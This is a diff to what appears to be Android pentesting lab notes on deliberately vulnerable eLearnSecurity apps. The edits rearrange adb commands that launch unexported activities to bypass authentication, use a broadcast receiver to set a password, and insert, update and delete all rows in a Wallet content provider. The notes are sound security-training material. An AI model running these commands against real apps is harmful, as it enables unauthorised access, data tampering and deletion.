@@ -2586,7 +2586,7 @@ public void onActivityResult(int requestCode, int resultCode, Intent data) {
 
 ![](.gitbook/assets/image-20240111190023338.png)
 
-- When the exploit app is run, a `Hello world!` message will be displayed but on the background launches `LeakyActivity`, extract th result and wirtes it in its logs.
+- When the exploit app is run, a `Hello world!` message will be displayed but on the background launches `LeakyActivity`, extract the result and writes it in its logs.
 
 ---
 
@@ -2660,11 +2660,7 @@ pidcat.py com.elearnsecurity.vulnerablereceiver
 ```
 
 ```bash
-adb shell
-su
-
-am start -n com.elearnsecurity.vulnerablereceiver/.MainActivity
-am start -n com.elearnsecurity.vulnerablereceiver/.ProfitActivity
+adb shell am start -n com.elearnsecurity.vulnerablereceiver/.MainActivity
 ```
 
 ![](.gitbook/assets/image-20240111192635648.png)
@@ -2674,7 +2670,9 @@ am start -n com.elearnsecurity.vulnerablereceiver/.ProfitActivity
 Bypass application's authentication.
 
 ```bash
-adb shell am start -n com.elearnsecurity.insecureactivities/.SecretActivity
+adb shell
+su
+am start -n com.elearnsecurity.vulnerablereceiver/.ProfitActivity
 ```
 
 📌 `MainActivity` class
@@ -2788,9 +2786,7 @@ public class VulnerableReceiver extends BroadcastReceiver {
 Launch the attack via `adb` by interacting with the identified vulnerable broadcast receiver.
 
 ```bash
-adb shell
-su
-am broadcast -a com.elearnsecurity.vulnerablereceiver.CHANGEPW -e PASSWORD 1234
+adb shell am broadcast -a com.elearnsecurity.vulnerablereceiver.CHANGEPW -e PASSWORD 1234
 ```
 
 - Password is set now, and login can be made with pw `1234`
@@ -3219,6 +3215,9 @@ content insert --uri content://com.elearnsecurity.provider.Wallet/cards --bind n
 
 # Update the content
 content update --uri content://com.elearnsecurity.provider.Wallet/cards --bind number:i:99999 --where "name='Tina'"
+
+# Delete everything
+content delete --uri content://com.elearnsecurity.provider.Wallet/cards
 ```
 
 ![](.gitbook/assets/image-20240111214023949.png)
